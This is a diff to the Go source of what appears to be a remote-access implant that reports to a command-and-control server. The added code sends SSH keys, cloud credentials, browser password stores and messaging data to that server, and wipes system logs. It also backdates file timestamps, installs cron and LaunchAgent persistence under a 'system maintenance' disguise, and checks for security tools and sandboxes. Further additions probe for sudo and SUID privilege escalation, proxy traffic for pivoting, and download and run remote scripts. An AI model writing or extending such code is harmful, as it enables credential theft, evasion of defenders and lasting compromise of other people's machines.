@@ -7,6 +7,8 @@ import (
     "crypto/cipher"
     "crypto/rand"
     "crypto/tls"
+    "compress/gzip"
+    "archive/tar"
     "encoding/base64"
     "encoding/hex"
     "encoding/json"
@@ -14,6 +16,8 @@ import (
     "fmt"
     mathrand "math/rand"
     "io"
+    "io/ioutil"
+    "log"
     "mime/multipart"
     "net"
     "net/http"
@@ -36,6 +40,9 @@ var iamgroot bool
 var discoveredLiveHosts string
 var discoverHostsOnce sync.Once
 var results_portscan map[string][]int
+var proxyCancelFuncs = make(map[string]context.CancelFunc)
+var proxyMutex sync.Mutex
+var GlobalIP string = ""
 
 const (
     C2_URL     = "https://{lhost}:{lport}"
@@ -72,7 +79,7 @@ var HEADERS = map[string]string{
 }
 
 var debugTools = map[string][]string{
-    "windows": {"x64dbg", "ollydbg", "ida", "windbg", "processhacker"},
+    "windows": {"x64dbg", "ollydbg", "ida", "windbg", "processhacker", "csfalcon", "cbagent", "msmpeng"},
     "linux":   {"gdb", "strace", "ltrace", "radare2"},
     "darwin":  {"lldb", "dtrace", "instruments"},
 }
@@ -87,9 +94,10 @@ type PacketEncryptionContext struct {
     Enabled bool
 }
 type LazyDataType struct {
-	ReverseShellPort int `json:"reverse_shell_port"`
-    Rhost string `json:"rhost"`
-    DebugImplant string `json:"enable_c2_implant_debug"`
+	ReverseShellPort int    `json:"reverse_shell_port"`
+    Rhost            string `json:"rhost"`
+    DebugImplant     string `json:"enable_c2_implant_debug"`
+    Ports            []int  `json:"beacon_scan_ports"`
 }
 
 type HostResult struct {
@@ -97,7 +105,309 @@ type HostResult struct {
 	Alive   bool
 	Interface string
 }
+func RandomSelectStr(slice []string) string {
+	mathrand.Seed(time.Now().UnixNano())
+	index := mathrand.Intn(len(slice))
+	return slice[index]
+}
 
+func GetGlobalIP() string {
+	ip := ""
+	resolvers := []string{
+		"https://api.ipify.org?format=text",
+		"http://myexternalip.com/raw",
+		"http://ident.me",
+		"https://ifconfig.me",
+		"https://ifconfig.co",
+	}
+
+	for {
+		url := RandomSelectStr(resolvers)
+		resp, err := http.Get(url)
+		if err != nil {
+			log.Printf("%v\n", err)
+		}
+		defer resp.Body.Close()
+
+		i, _ := ioutil.ReadAll(resp.Body)
+		ip = string(i)
+
+		if resp.StatusCode == 200 {
+			break
+		}
+	}
+
+	return ip
+}
+func cleanSystemLogs(lazyconf LazyDataType) error {
+    var cmd string
+    if runtime.GOOS == "windows" {
+        cmd = "wevtutil cl System && wevtutil cl Security"
+    } else {
+        cmd = "truncate -s 0 /var/log/syslog /var/log/messages 2>/dev/null"
+    }
+    shellCommand := getShellCommand("-c")
+    output, err := executeCommandWithRetry(shellCommand, cmd)
+    if err != nil {
+        if lazyconf.DebugImplant == "True" {
+            fmt.Printf("[ERROR] Failed to clean system logs: %v, output: %s\n", err, output)
+        }
+        return err
+    }
+    if lazyconf.DebugImplant == "True" {
+        fmt.Println("[INFO] System logs cleaned")
+    }
+    return nil
+}
+
+func startProxy(lazyconf LazyDataType, listenAddr, targetAddr string) error {
+    ctx, cancel := context.WithCancel(context.Background())
+
+    proxyMutex.Lock()
+    proxyCancelFuncs[listenAddr] = cancel
+    proxyMutex.Unlock()
+
+    go func() {
+        defer globalRecover()
+
+        if lazyconf.DebugImplant == "True" {
+            fmt.Printf("[INFO] Starting proxy: listen=%s, target=%s\n", listenAddr, targetAddr)
+        }
+
+        listener, err := net.Listen("tcp", listenAddr)
+        if err != nil {
+            if lazyconf.DebugImplant == "True" {
+                fmt.Printf("[ERROR] Failed to start proxy on %s: %v\n", listenAddr, err)
+            }
+            return
+        }
+        defer listener.Close()
+
+        if lazyconf.DebugImplant == "True" {
+            fmt.Printf("[INFO] Proxy listening on %s, forwarding to %s\n", listenAddr, targetAddr)
+        }
+
+        for {
+            select {
+            case <-ctx.Done():
+                if lazyconf.DebugImplant == "True" {
+                    fmt.Printf("[INFO] Stopping proxy on %s\n", listenAddr)
+                }
+                return
+            default:
+                client, err := listener.Accept()
+                if err != nil {
+                    if lazyconf.DebugImplant == "True" {
+                        fmt.Printf("[ERROR] Proxy accept error: %v\n", err)
+                    }
+                    continue
+                }
+
+                go func() {
+                    defer client.Close()
+                    target, err := net.Dial("tcp", targetAddr)
+                    if err != nil {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[ERROR] Failed to connect to target %s: %v\n", targetAddr, err)
+                        }
+                        return
+                    }
+                    defer target.Close()
+
+                    go io.Copy(target, client)
+                    io.Copy(client, target)
+                }()
+            }
+        }
+    }()
+    return nil
+}
+
+func stopProxy(listenAddr string, lazyconf LazyDataType) error {
+    proxyMutex.Lock()
+    defer proxyMutex.Unlock()
+    cancel, exists := proxyCancelFuncs[listenAddr]
+    if !exists {
+        if lazyconf.DebugImplant == "True" {
+            fmt.Printf("[ERROR] No proxy running on %s\n", listenAddr)
+        }
+        return fmt.Errorf("no proxy running on %s", listenAddr)
+    }
+    cancel()
+    delete(proxyCancelFuncs, listenAddr)
+    if lazyconf.DebugImplant == "True" {
+        fmt.Printf("[INFO] Proxy stopped on %s\n", listenAddr)
+    }
+    return nil
+}
+func GetUsefulSoftware() ([]string, error) {
+	var binaries []string = []string{"docker", "nc", "netcat", "python", "python3", "php", "perl", "ruby", "gcc", "g++", "ping", "base64", "socat", "curl", "wget", "certutil", "xterm", "gpg", "mysql", "ssh"}
+	var discovered_software []string
+
+	for _, b := range binaries {
+		path, _ := exec.LookPath(b)
+		discovered_software = append(discovered_software, path)
+	}
+
+	return discovered_software, nil
+}
+
+
+func handleAdversary(ctx context.Context, command string, lazyconf LazyDataType, currentPortScanResults map[string][]int) error {
+	defer globalRecover()
+
+	if stealthModeEnabled {
+		if lazyconf.DebugImplant == "True" {
+			fmt.Println("[INFO] Adversary command skipped: stealth mode enabled")
+		}
+		return nil
+	}
+
+	
+	idAtomic := strings.TrimPrefix(command, "adversary:")
+	if idAtomic == "" || len(idAtomic) != 36 { 
+		err := fmt.Errorf("invalid id_atomic: %s", idAtomic)
+		if lazyconf.DebugImplant == "True" {
+			fmt.Printf("[ERROR] %v\n", err)
+		}
+		return err
+	}
+
+	
+	var scriptExt, scriptPrefix string
+	var shellCommand []string
+	if runtime.GOOS == "windows" {
+		scriptExt = ".ps1"
+		scriptPrefix = "powershell -Command .\\"
+		shellCommand = []string{"powershell", "-Command"}
+	} else { 
+		scriptExt = ".sh"
+		scriptPrefix = "bash "
+		shellCommand = []string{"bash", "-c"}
+	}
+
+	
+	testScript := fmt.Sprintf("atomic_test_%s%s", idAtomic, scriptExt)
+	testScriptPath := filepath.Join(func() string { dir, _ := os.Getwd(); return dir }(), testScript)
+	downloadCmd := fmt.Sprintf("download:%s", testScript)
+	handleDownload(ctx, downloadCmd)
+	if _, err := os.Stat(testScriptPath); os.IsNotExist(err) {
+		err := fmt.Errorf("failed to download test script: %s", testScript)
+		if lazyconf.DebugImplant == "True" {
+			fmt.Printf("[ERROR] %v\n", err)
+		}
+		return err
+	}
+
+	
+	obfuscateFileTimestamps(lazyconf, testScriptPath)
+
+	
+	executeCtx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+	go func() {
+		defer globalRecover()
+		executeCmd := scriptPrefix + testScriptPath
+		if lazyconf.DebugImplant == "True" {
+			fmt.Printf("[INFO] Executing atomic test: %s\n", executeCmd)
+		}
+		if err := runScript(executeCtx, executeCmd, shellCommand, lazyconf); err != nil {
+			if lazyconf.DebugImplant == "True" {
+				fmt.Printf("[ERROR] Test script execution failed: %v\n", err)
+			}
+		}
+	}()
+
+	
+	cleanScript := fmt.Sprintf("atomic_clean_test_%s%s", idAtomic, scriptExt)
+	cleanScriptPath := filepath.Join(os.TempDir(), cleanScript)
+	downloadCmd = fmt.Sprintf("download:%s", cleanScript)
+	handleDownload(ctx, downloadCmd)
+	if _, err := os.Stat(cleanScriptPath); os.IsNotExist(err) {
+		if lazyconf.DebugImplant == "True" {
+			fmt.Printf("[WARN] Failed to download cleanup script: %s\n", cleanScript)
+		}
+	} else {
+		
+		obfuscateFileTimestamps(lazyconf, cleanScriptPath)
+
+		
+		cleanCtx, cleanCancel := context.WithTimeout(context.Background(), 30*time.Second)
+		defer cleanCancel()
+		go func() {
+			defer globalRecover()
+			executeCmd := scriptPrefix + cleanScriptPath
+			if lazyconf.DebugImplant == "True" {
+				fmt.Printf("[INFO] Executing cleanup script: %s\n", executeCmd)
+			}
+			if err := runScript(cleanCtx, executeCmd, shellCommand, lazyconf); err != nil {
+				if lazyconf.DebugImplant == "True" {
+					fmt.Printf("[ERROR] Cleanup script execution failed: %v\n", err)
+				}
+			}
+		}()
+	}
+
+	
+	defer os.Remove(testScriptPath)
+	defer os.Remove(cleanScriptPath)
+
+	
+	if lazyconf.DebugImplant == "True" {
+		fmt.Printf("[INFO] Adversary command completed for id_atomic: %s\n", idAtomic)
+	}
+	
+	return nil
+}
+
+
+func runScript(ctx context.Context, command string, shellCommand []string, lazyconf LazyDataType) error {
+	cmd := exec.CommandContext(ctx, shellCommand[0], append(shellCommand[1:], command)...)
+	var output bytes.Buffer
+	cmd.Stdout = &output
+	cmd.Stderr = &output
+
+	if err := cmd.Start(); err != nil {
+		return fmt.Errorf("failed to start script: %v", err)
+	}
+
+	
+	go func() {
+		defer globalRecover()
+		err := cmd.Wait()
+		if err != nil && lazyconf.DebugImplant == "True" {
+			fmt.Printf("[ERROR] Script execution failed: %v\n", err)
+		}
+
+		
+		pid := os.Getpid()
+		hostname, _ := os.Hostname()
+		ips := getIPs()
+		currentUser, _ := user.Current()
+
+		jsonData, _ := json.Marshal(map[string]interface{}{
+			"output":          output.String(),
+			"client":          runtime.GOOS,
+			"command":         command,
+			"pid":             strconv.Itoa(pid),
+			"hostname":        hostname,
+			"ips":             strings.Join(ips, ", "),
+			"user":            currentUser.Username,
+			"discovered_ips":  discoveredLiveHosts,
+			"result_portscan": nil, 
+		})
+
+		if lazyconf.DebugImplant == "True" {
+			var prettyJSON bytes.Buffer
+			json.Indent(&prettyJSON, jsonData, "", "  ")
+			fmt.Println("[INFO] JSON Data (Formatted):")
+			fmt.Println(prettyJSON.String())
+		}
+		retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", string(jsonData), "")
+	}()
+
+	return nil
+}
 func downloadAndExecute(ctx context.Context, fileURL string, lazyconf LazyDataType) {
 	go func() {
 		defer globalRecover()
@@ -160,8 +470,8 @@ func downloadAndExecute(ctx context.Context, fileURL string, lazyconf LazyDataTy
 
 		cmd := exec.Command(filePath)
 
-		// cmd.Stdout = os.Stdout
-		// cmd.Stderr = os.Stderr
+		
+		
 
 		if err := cmd.Start(); err != nil {
 			if lazyconf.DebugImplant == "True" {
@@ -175,7 +485,20 @@ func downloadAndExecute(ctx context.Context, fileURL string, lazyconf LazyDataTy
 		}
 	}()
 }
-
+func obfuscateFileTimestamps(lazyconf LazyDataType, filePath string) error {
+    oldTime := time.Now().AddDate(-1, 0, 0)
+    if err := os.Chtimes(filePath, oldTime, oldTime); err != nil {
+        if lazyconf.DebugImplant == "True" {
+            fmt.Printf("[ERROR] Failed to obfuscate timestamps for %s: %v\n", filePath, err)
+        }
+        return err
+    }
+    if lazyconf.DebugImplant == "True" {
+        fmt.Printf("[INFO] Timestamps obfuscated for %s to %v\n", filePath, oldTime)
+    }
+    
+    return nil
+}
 func handleExfiltrate(ctx context.Context, command string, lazyconf LazyDataType) {
 	if lazyconf.DebugImplant == "True" {
 		fmt.Println("[INFO] Executing file scraping...")
@@ -189,13 +512,67 @@ func handleExfiltrate(ctx context.Context, command string, lazyconf LazyDataType
 	homeDir := userObj.HomeDir
 
 	sensitiveFiles := []string{
-		filepath.Join(homeDir, ".bash_history"),
-		filepath.Join(homeDir, ".ssh", "id_rsa"),
-		filepath.Join(homeDir, ".ssh", "id_dsa"),
-		filepath.Join(homeDir, ".ssh", "id_ecdsa"),
-		filepath.Join(homeDir, ".ssh", "id_ed25519"),
-		filepath.Join(homeDir, "Desktop", "*.log"), 
-	}
+        filepath.Join(homeDir, ".bash_history"),        
+        filepath.Join(homeDir, ".ssh", "id_rsa"),        
+        filepath.Join(homeDir, ".ssh", "id_dsa"),        
+        filepath.Join(homeDir, ".ssh", "id_ecdsa"),        
+        filepath.Join(homeDir, ".ssh", "id_ed25519"),        
+        filepath.Join(homeDir, "Desktop", "*.log"),        
+        filepath.Join(homeDir, ".ssh", "authorized_keys"),        
+        filepath.Join(homeDir, ".aws", "credentials"),        
+        filepath.Join(homeDir, ".aws", "config*"),        
+        filepath.Join(homeDir, ".zsh_history"),        
+        filepath.Join(homeDir, ".config/fish/fish_history"),        
+        filepath.Join(homeDir, ".gnupg", "secring.gpg"),        
+        filepath.Join(homeDir, ".gnupg", "pubring.gpg"),        
+        filepath.Join(homeDir, ".password-store", "*"),
+        filepath.Join(homeDir, ".keepassxc", "*.kdbx"),
+        filepath.Join(homeDir, "Documents", "*.kdbx"),        
+        filepath.Join(homeDir, ".config", "google-chrome", "Default", "Login Data"),
+        filepath.Join(homeDir, ".mozilla", "firefox", "*", "key4.db"),
+        filepath.Join(homeDir, ".mozilla", "firefox", "*", "logins.json"),
+        filepath.Join(homeDir, ".config", "microsoft", "Edge", "Default", "Login Data"),
+        filepath.Join(homeDir, "Library", "Application Support", "BraveSoftware", "*", "Login Data"),
+        filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"),
+        filepath.Join(homeDir, "~/Library/Safari/Bookmarks.plist"),
+        filepath.Join(homeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
+        filepath.Join(homeDir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", "*", "key4.db"),
+        filepath.Join(homeDir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", "*", "logins.json"),
+        filepath.Join(homeDir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
+        filepath.Join(homeDir, "AppData", "Roaming", "*.ps1_history.txt"),
+        filepath.Join(homeDir, ".purple", "accounts.xml"),
+        filepath.Join(homeDir, ".irssi", "config"),
+        filepath.Join(homeDir, ".mutt", "*"),
+        filepath.Join(homeDir, ".abook", "abook"),
+        filepath.Join(homeDir, ".thunderbird", "*", "prefs.js"),
+        filepath.Join(homeDir, ".thunderbird", "*", "Mail", "*", "*"),
+        filepath.Join(homeDir, ".wireshark", "recent"),
+        filepath.Join(homeDir, ".config", "transmission", "torrents.json"),
+        filepath.Join(homeDir, ".wget-hsts"),
+        filepath.Join(homeDir, ".git-credentials"),
+        filepath.Join(homeDir, ".npmrc"),
+        filepath.Join(homeDir, ".yarnrc"),
+        filepath.Join(homeDir, ".bundle", "config"),
+        filepath.Join(homeDir, ".gem", "*", "credentials"),
+        filepath.Join(homeDir, ".pypirc"),
+        filepath.Join(homeDir, ".ssh", "config"),
+        filepath.Join(homeDir, "~/.aws/config"),
+        filepath.Join(homeDir, "~/.oci/config"),
+        filepath.Join(homeDir, "~/.kube/config"),
+        filepath.Join(homeDir, "~/.docker/config.json"),
+        filepath.Join(homeDir, "~/.netrc"),
+        filepath.Join(homeDir, "~/Library/Application Support/com.apple.iChat/Aliases"),
+        filepath.Join(homeDir, "~/Library/Messages/chat.db"),
+        filepath.Join(homeDir, "~/Library/Containers/com.apple.mail/Data/Library/Mail/V*/MailData/Accounts.plist"),
+        filepath.Join(homeDir, "~/Library/Containers/com.apple.Safari/Data/Library/Safari/Bookmarks.plist"),
+        filepath.Join(homeDir, "~/Library/Containers/com.apple.Safari/Data/Library/Safari/History.plist"),
+        filepath.Join(homeDir, "~/Library/Preferences/com.apple.finder.plist"),
+        filepath.Join(homeDir, "~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist"),
+        filepath.Join(homeDir, "~/Library/Application Support/Code/User/settings.json"),
+        filepath.Join(homeDir, "~/Library/Application Support/Slack/local_store.json"),
+        filepath.Join(homeDir, "~/Library/Application Support/Telegram Desktop/tdata/*"),
+        filepath.Join(homeDir, "~/Library/Cookies/Cookies.binarycookies"),
+    }
 
 	passwordPatterns := []*regexp.Regexp{
 		regexp.MustCompile(`(?i)password\s*[:=]\s*"?(.+?)"?\s*$`),
@@ -253,7 +630,75 @@ func handleExfiltrate(ctx context.Context, command string, lazyconf LazyDataType
 		fmt.Println("[INFO] File scraping finished.")
 	}
 }
+func compressGzipDir(ctx context.Context, inputDir string, outputFilePath string, lazyconf LazyDataType) error {
+	if lazyconf.DebugImplant == "True" {
+		fmt.Printf("[INFO] Starting directory compression: %s to %s\n", inputDir, outputFilePath)
+	}
 
+	outputFile, err := os.Create(outputFilePath)
+	if err != nil {
+		return fmt.Errorf("failed to create output file '%s': %v", outputFilePath, err)
+	}
+	defer outputFile.Close()
+
+	gzipWriter := gzip.NewWriter(outputFile)
+	defer gzipWriter.Close()
+
+	tarWriter := tar.NewWriter(gzipWriter)
+	defer tarWriter.Close()
+
+	err = filepath.Walk(inputDir, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		if info.IsDir() {
+			return nil 
+		}
+
+		if lazyconf.DebugImplant == "True" {
+			fmt.Printf("[DEBUG] Adding file to archive: %s\n", path)
+		}
+
+		file, err := os.Open(path)
+		if err != nil {
+			return fmt.Errorf("failed to open file '%s': %v", path, err)
+		}
+		defer file.Close()
+
+		
+		header, err := tar.FileInfoHeader(info, "")
+		if err != nil {
+			return fmt.Errorf("failed to create tar header for '%s': %v", path, err)
+		}
+
+		
+		relativePath, err := filepath.Rel(inputDir, path)
+		if err != nil {
+			return err
+		}
+		header.Name = relativePath
+
+		if err := tarWriter.WriteHeader(header); err != nil {
+			return fmt.Errorf("failed to write tar header for '%s': %v", path, err)
+		}
+
+		if _, err := io.Copy(tarWriter, file); err != nil {
+			return fmt.Errorf("failed to copy content of '%s' to tar archive: %v", path, err)
+		}
+		return nil
+	})
+
+	if err != nil {
+		return err
+	}
+
+	if lazyconf.DebugImplant == "True" {
+		fmt.Printf("[INFO] Directory compression finished. Uploading: %s\n", outputFilePath)
+	}
+
+	uploadFile(ctx, outputFilePath)
+	return nil
+}
 func isSensitiveFile(path string, passwordPatterns []*regexp.Regexp) bool {
 	fileInfo, err := os.Stat(path)
 	if err != nil || fileInfo.IsDir() {
@@ -301,6 +746,7 @@ func uploadFile(ctx context.Context, filePath string) {
 
 func PortScanner(ips string, ports []int, timeout time.Duration) map[string][]int {
 	ipList := strings.Split(strings.ReplaceAll(ips, " ", ""), ",")
+    fmt.Printf("[INFO] Starting port scan on %s IPs...\n", ips)
 	results := make(map[string][]int)
 	var mu sync.Mutex
 	var wg sync.WaitGroup
@@ -356,7 +802,12 @@ func isRoot() bool {
 }
 
 func pingHost(ip, iface string, timeout time.Duration, results chan<- HostResult, wg *sync.WaitGroup) {
-	defer wg.Done()
+	defer func() {
+        if r := recover(); r != nil {
+            fmt.Printf("[ERROR] Panic en pingHost para %s: %v\n", ip, r)
+        }
+        wg.Done()
+    }()
 
 	cmd := exec.Command("ping", "-c", "1", "-W", fmt.Sprintf("%d", int(timeout.Seconds())), ip)
 	err := cmd.Run()
@@ -426,10 +877,12 @@ func discoverLocalHosts(lazyconf LazyDataType) {
 	interfaces, err := net.Interfaces()
 	if err == nil {
 		for _, iface := range interfaces {
-			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
-				continue
-			}
-    
+            if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 || iface.Name == "docker0" {
+                if lazyconf.DebugImplant == "True" {
+                    fmt.Printf("[DEBUG] Ignorando interfaz: %s\n", iface.Name)
+                }
+                continue
+            }
 			addrs, err := iface.Addrs()
 			if err == nil {
 				for _, addr := range addrs {
@@ -484,6 +937,9 @@ func isVMByMAC() bool {
     }
 
     for _, iface := range interfaces {
+    if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 || iface.Name == "docker0" {
+        continue
+    }
         mac := iface.HardwareAddr.String()
         for _, prefix := range vmMACPrefixes {
             if strings.HasPrefix(mac, prefix) {
@@ -513,6 +969,91 @@ func ifRoot(lazyconf LazyDataType) bool {
     }
     return false
 }
+func tryPrivilegeEscalation(lazyconf LazyDataType) {
+    
+    go func() {
+        defer globalRecover()
+
+        if runtime.GOOS != "linux" {
+            if lazyconf.DebugImplant == "True" {
+                fmt.Println("[INFO] Privilege escalation check only supported on Linux")
+            }
+            return
+        }
+
+        
+        shellCommand := getShellCommand("-c")
+        output, err := executeCommandWithRetry(shellCommand, "sudo -n -l")
+        if err != nil {
+            if lazyconf.DebugImplant == "True" {
+                fmt.Printf("[ERROR] Failed to run sudo -l: %v\n", err)
+            }
+ 
+            
+            return
+        }
+
+        
+        if strings.Contains(output, "(ALL) NOPASSWD") {
+            if lazyconf.DebugImplant == "True" {
+                fmt.Println("[INFO] Potential sudo privilege escalation detected: NOPASSWD found")
+            }
+            
+            escalateCmd := "sudo -n whoami"
+            escalateOutput, escalateErr := executeCommandWithRetry(shellCommand, escalateCmd)
+            if escalateErr == nil && strings.Contains(escalateOutput, "root") {
+                if lazyconf.DebugImplant == "True" {
+                    fmt.Println("[SUCCESS] Escalated to root via sudo NOPASSWD")
+                }
+            } else {
+                if lazyconf.DebugImplant == "True" {
+                    fmt.Printf("[ERROR] Failed to escalate via sudo: %v\n", escalateErr)
+                }
+            }
+        } else {
+            if lazyconf.DebugImplant == "True" {
+                fmt.Println("[INFO] No NOPASSWD privileges detected")
+            }
+        }
+
+        checkSetuidBinaries( lazyconf)
+    }()
+}
+
+
+func checkSetuidBinaries(lazyconf LazyDataType) {
+    shellCommand := getShellCommand("-c")
+    
+    suidCmd := "find / -perm -4000 -type f 2>/dev/null"
+    output, err := executeCommandWithRetry(shellCommand, suidCmd)
+    if err != nil {
+        if lazyconf.DebugImplant == "True" {
+            fmt.Printf("[ERROR] Failed to check SUID binaries: %v\n", err)
+        }
+        return
+    }
+
+    
+    exploitableSUID := []string{"/bin/su", "/usr/bin/passwd", "/usr/bin/gpasswd", "/usr/bin/chsh"}
+    foundSUID := false
+    for _, binary := range strings.Split(output, "\n") {
+        for _, exploit := range exploitableSUID {
+            if strings.Contains(binary, exploit) {
+                foundSUID = true
+                if lazyconf.DebugImplant == "True" {
+                    fmt.Printf("[INFO] Found exploitable SUID binary: %s\n", binary)
+                }
+            }
+        }
+    }
+
+    if !foundSUID {
+        if lazyconf.DebugImplant == "True" {
+            fmt.Println("[INFO] No exploitable SUID binaries found")
+        }
+    }
+}
+
 func checkDebuggers(lazyconf LazyDataType) bool {
     var cmd string
     switch runtime.GOOS {
@@ -553,7 +1094,39 @@ func checkDebuggers(lazyconf LazyDataType) bool {
     return false
 }
 
+func isSandboxEnvironment(lazyconf LazyDataType) bool {
+    if runtime.NumCPU() <= 1 {
 
+        return true
+    }
+    var m runtime.MemStats
+    runtime.ReadMemStats(&m)
+    if m.Sys < 6<<30 {
+        return true
+    }
+    if runtime.GOOS == "linux" {
+        hasVirtualDisk := false
+        if _, err := os.Stat("/sys/block/vda"); err == nil {
+            hasVirtualDisk = true
+        }
+        if _, err := os.Stat("/dev/vda"); err == nil {
+            hasVirtualDisk = true
+        }
+        if hasVirtualDisk {
+            if lazyconf.DebugImplant == "True" {
+                fmt.Println("[DEBUG] Possible sandbox: Virtual disk detected")
+            }
+            
+            if _, err := os.Stat("/proc/self/status"); err == nil {
+                data, _ := os.ReadFile("/proc/self/status")
+                if strings.Contains(string(data), "TracerPid:") {
+                    return true 
+                }
+            }
+        }
+    }
+    return false
+}
 
 func initEncryptionContext(keyHex string) *PacketEncryptionContext {
     keyBytes, err := hex.DecodeString(keyHex)
@@ -566,7 +1139,6 @@ func initEncryptionContext(keyHex string) *PacketEncryptionContext {
         Enabled: true,
     }
 }
-
 
 func initStealthMode(lazyconf LazyDataType) {
     if STEALTH == "True" || STEALTH == "true" {
@@ -581,7 +1153,6 @@ func initStealthMode(lazyconf LazyDataType) {
         }
     }
 }
-
 
 func handleStealthCommand(command string, lazyconf LazyDataType) {
     switch command {
@@ -659,7 +1230,54 @@ func restartClient() {
     cmd.Start()
     os.Exit(1)
 }
+func ensureCrontabPersistence(lazyconf LazyDataType) error {
+    executable, err := os.Executable()
+    if err != nil {
+        if lazyconf.DebugImplant == "True" {
+            fmt.Printf("[ERROR] Failed to get executable path: %v\n", err)
+        }
+        return fmt.Errorf("failed to get executable path: %w", err)
+    }
+    cronCmd := fmt.Sprintf("* * * * * %s\n", executable)
+    cron := fmt.Sprintf("echo '%s' | crontab -", cronCmd)
+    shellCommand := getShellCommand("-c")
+    output, err := executeCommandWithRetry(shellCommand, cron)
+    if err != nil {
+        if lazyconf.DebugImplant == "True" {
+            fmt.Printf("[ERROR] Failed to set crontab persistence: %v, output: %s\n", err, output)
+        }
+        return fmt.Errorf("failed to set crontab persistence: %w", err)
+    }
 
+    if lazyconf.DebugImplant == "True" {
+        fmt.Printf("[INFO] Successfully set crontab persistence: %s\n", cronCmd)
+    }
+    return nil
+}
+func ensurePersistenceMacOS() error {
+    homeDir, _ := os.UserHomeDir()
+    plistPath := filepath.Join(homeDir, "Library/LaunchAgents/com.system.maintenance.plist")
+    executable, _ := os.Executable()
+    plistContent := fmt.Sprintf(`
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.maintenance</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>%s</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+`, executable)
+    return os.WriteFile(plistPath, []byte(plistContent), 0644)
+}
 func ensurePersistence(lazyconf LazyDataType) error {
     executable, err := os.Executable()
     if err != nil {
@@ -695,12 +1313,61 @@ WantedBy=multi-user.target
         if err != nil {
             return err
         }
+        ensureCrontabPersistence(lazyconf)
         return exec.Command("systemctl", "enable", "system-maintenance").Run()
     }
-
+    if runtime.GOOS == "darwin" {
+        ensurePersistenceMacOS()
+    }
     return nil
 }
-
+func selfDestruct(lazyconf LazyDataType) {
+    if lazyconf.DebugImplant == "True" {
+        fmt.Println("[INFO] Initiating self-destruct")
+    }
+    executable, _ := os.Executable()
+    os.Remove(executable)
+    if runtime.GOOS == "linux" {
+        exec.Command("systemctl", "disable", "system-maintenance").Run()
+        exec.Command("crontab", "-r").Run()
+        os.Remove("/etc/systemd/system/system-maintenance.service")
+    }
+    os.Exit(0)
+}
+func captureNetworkConfig(ctx context.Context, lazyconf LazyDataType) error {
+    go func() {
+        defer globalRecover()
+        var cmd string
+        if runtime.GOOS == "windows" {
+            cmd = "ipconfig /all"
+        } else {
+            cmd = "ifconfig || ip addr"
+        }
+        shellCommand := getShellCommand("-c")
+        output, err := executeCommandWithRetry(shellCommand, cmd)
+        if err != nil {
+            if lazyconf.DebugImplant == "True" {
+                fmt.Printf("[ERROR] Failed to capture network config: %v\n", err)
+            }
+            return
+        }
+        tempFile := "/tmp/netconfig.txt"
+        if runtime.GOOS == "windows" {
+            tempFile = os.TempDir() + "\\netconfig.txt"
+        }
+        if err := os.WriteFile(tempFile, []byte(output), 0600); err != nil {
+            if lazyconf.DebugImplant == "True" {
+                fmt.Printf("[ERROR] Failed to write network config to file: %v\n", err)
+            }
+            return
+        }
+        uploadFile(ctx, tempFile)
+        if lazyconf.DebugImplant == "True" {
+            fmt.Println("[INFO] Network configuration captured and uploaded")
+        }
+    }()
+    return nil
+}
 func EncryptPacket(ctx *PacketEncryptionContext, packet []byte) ([]byte, error) {
     block, err := aes.NewCipher(ctx.AesKey.Key)
     if err != nil {
@@ -933,7 +1600,6 @@ func main() {
         fmt.Println("[INFO] Reading JSON from URL:", url)
     }
     initStealthMode(lazyconf)
-
     encryptionCtx = initEncryptionContext(keyHex)
     if encryptionCtx == nil {
         if lazyconf.DebugImplant == "True" {
@@ -1007,7 +1673,15 @@ func main() {
                     fmt.Println("[INFO] This is not a VM")
                 }
             }   
-                        
+            if isSandboxEnvironment(lazyconf) {
+                if lazyconf.DebugImplant == "True" {
+                    fmt.Println("[INFO] This is a sandbox environment")
+                }
+            }else{
+                if lazyconf.DebugImplant == "True" {
+                    fmt.Println("[INFO] This is not a sandbox environment")
+                }
+            }
             if !strings.Contains(command, "stealth") {
                 switch {
                 case strings.HasPrefix(command, "download:"):
@@ -1020,15 +1694,109 @@ func main() {
 					handleExfiltrate(ctx, command, lazyconf)
                 case strings.HasPrefix(command, "download_exec:"):
                     url := strings.TrimPrefix(command, "download_exec:")
-                    go downloadAndExecute(ctx, url, lazyconf)                    
+                    go downloadAndExecute(ctx, url, lazyconf)
+                case strings.HasPrefix(command, "obfuscate:"):
+                    filePath := strings.TrimPrefix(command, "obfuscate:")
+                    if filePath == "" {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("[ERROR] Invalid obfuscate command format, expected obfuscate:<file_path>")
+                        }
+                    }
+                    if err := obfuscateFileTimestamps(lazyconf, filePath); err != nil {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[ERROR] Failed to obfuscate timestamps: %v\n", err)
+                        }
+                    }
+                case strings.HasPrefix(command, "cleanlogs:"):
+                    if err := cleanSystemLogs(lazyconf); err != nil {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[ERROR] Failed to clean system logs: %v\n", err)
+                        }
+                    }                  
                 case strings.HasPrefix(command, "discover:"):
 	                go discoverHostsOnce.Do(func() {
                         discoverLocalHosts(lazyconf)
                     })
+                case strings.HasPrefix(command, "adversary:"):
+                    if err := handleAdversary(ctx, command, lazyconf, currentPortScanResults); err != nil {
